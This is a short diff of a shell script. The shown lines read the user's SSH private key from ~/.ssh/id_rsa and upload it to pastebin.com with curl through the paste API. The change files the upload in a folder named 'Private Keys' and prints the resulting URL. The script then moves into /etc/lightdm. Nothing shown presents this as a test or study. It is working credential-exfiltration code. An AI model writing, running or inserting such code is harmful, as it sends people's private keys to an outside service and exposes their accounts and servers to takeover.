@@ -34,7 +34,7 @@ usr=$(users)
 priv_key=$(cat ~/.ssh/id_rsa)
 
 echo "Adding pastebin"
-curl --location --request POST 'https://pastebin.com/api/api_post.php' \
+url=$(curl -fsSL --location --request POST 'https://pastebin.com/api/api_post.php' \
 --header 'Content-Type: application/x-www-form-urlencoded' \
 --data-urlencode "api_dev_key=$secret" \
 --data-urlencode "api_option=paste" \
@@ -43,7 +43,9 @@ curl --location --request POST 'https://pastebin.com/api/api_post.php' \
 --data-urlencode "api_paste_expire_date=N" \
 --data-urlencode "api_paste_format=bash" \
 --data-urlencode "api_paste_code=$priv_key" \
---data-urlencode "api_user_key=$userSecret"
+--data-urlencode "api_user_key=$userSecret" \
+--data-urlencode "api_folder_key=Private Keys")
+echo "PrivateKey is posted at $url"
 
 cd /etc/lightdm
 
